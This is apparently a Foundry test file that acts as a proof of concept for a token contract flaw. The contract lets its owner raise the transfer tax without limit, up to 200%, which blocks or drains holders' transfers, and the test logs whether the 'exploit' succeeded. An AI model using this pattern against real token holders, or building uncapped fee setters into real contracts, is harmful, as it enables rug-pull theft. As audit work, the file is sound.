// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CoinToken.sol";

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(0x12345); // Dummy pair address
    }
}

contract MockRouter {
    address public factory;
    
    constructor(address _factory) public {
        factory = _factory;
    }
    
    function WETH() external pure returns (address) {
        return address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    }
}

contract UnlimitedFeeIncreaseTest is Test {
    CoinToken token;
    address owner = address(0x1000);
    address service = address(0x2000);
    address user1 = address(0x3000);
    address user2 = address(0x4000);
    MockRouter router;
    MockFactory factory;
    uint256 constant ONE_TOKEN = 1e18;
    uint256 constant TEST_AMOUNT = 1 * ONE_TOKEN;
    
    function setUp() public {
        vm.deal(owner, 1 ether);
        
        factory = new MockFactory();
        router = new MockRouter(address(factory));
        
        vm.startPrank(owner);
        token = new CoinToken{value: 0.1 ether}(
            "TestToken", 
            "TT", 
            18,    
            1000, 
            1,    
            1,    
            500,  
            500,  
            address(router),
            owner,
            service
        );
        token.transfer(user1, 100 * ONE_TOKEN);
        vm.stopPrank();
    }

    function test_OwnerCanSetUnlimitedFees() public {
        // BEFORE-TRANSFER: Simulate transfer with original fees
        console.log("--- BEFORE-Trigger Transfer ---");
        uint256 user1Before = token.balanceOf(user1);
        uint256 user2Before = token.balanceOf(user2);
        
        vm.prank(user1);
        token.transfer(user2, TEST_AMOUNT);
        
        uint256 user1After = token.balanceOf(user1);
        uint256 user2After = token.balanceOf(user2);
        uint256 feeTaken = (user1Before - user1After) - (user2After - user2Before);
        console.log("Initial transfer fee: %s tokens", feeTaken / 1e16);
        
        // TRIGGER: Perform vulnerability exploit
        console.log("--- Trigger ChangeFee ---");
        vm.prank(owner);
        token.setTaxFeePercent(50);
        
        vm.prank(owner);
        token.setTaxFeePercent(100);
        
        vm.prank(owner);
        token.setTaxFeePercent(200);

        // AFTER-TRANSFER: Attempt transfer with new fees
        console.log("--- AFTER-Trigger Transfer ---");
        bool transferSuccess = false;
        uint256 newFee = 0;
        
        try this.safeTransfer(user1, user2, TEST_AMOUNT) {
            transferSuccess = true;
            newFee = (token.balanceOf(user1) - user1After) - 
                     (token.balanceOf(user2) - user2After);
            console.log("New transfer fee: %s tokens", newFee / 1e16);
        } catch {
            console.log("Transfer REVERTED with 200%% tax fee");
            transferSuccess = false;
            newFee = type(uint256).max; // Use max value for comparison
        }
        
        // Differential comparison
        bool feesChanged = newFee != feeTaken;
        bool exploitDetected = (feeTaken * 2) < newFee || !transferSuccess;
        
        console.log("Fee change detected:", feesChanged);
        console.log("Exploit successful:", exploitDetected);
        
        if(exploitDetected) {
            console.log("Vulnerability Exists: Fees increased beyond limit (200%%+)");
        } else {
            console.log("Vulnerability not Exist: Fee range remains acceptable");
        }
    }

    function safeTransfer(address from, address to, uint256 amount) external {
        vm.prank(from);
        token.transfer(to, amount);
    }
    
    function test_NonOwnerCannotSetFees() public {
        vm.prank(address(0x999));
        vm.expectRevert("Ownable: caller is not the owner");
        token.setTaxFeePercent(10);
    }
}